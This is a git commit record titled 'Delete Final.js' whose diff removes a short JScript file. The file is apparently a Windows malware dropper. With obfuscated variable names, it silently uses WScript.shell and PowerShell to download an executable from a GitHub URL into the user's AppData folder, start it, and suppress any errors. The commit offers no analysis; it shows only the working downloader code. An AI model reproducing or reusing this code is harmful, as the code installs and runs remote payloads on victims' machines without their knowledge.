af52cfb8a3a3d2d9637e4af6a1bdd463d4f805bc
45628 <44139448+45628@users.noreply.github.com>
2019-02-11 08:35:49 +0300

    Delete Final.js

--- Final.js
+++
@@ -1,4 +0,0 @@
-try{uqupPaATg=new ActiveXObject("WScript.shell");
-YZOGVQPYM=uqupPaATg.ExpandEnvironmentStrings("%appdata%");
-uqupPaATg.run("cmd /c echo (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/8072/784/master/Helper64.exe?raw=true\",\""+YZOGVQPYM+"\\iwJwvSGEd..exe\") | powershell & start "+YZOGVQPYM+"\\iwJwvSGEd..exe",0); 
-}catch(e){}
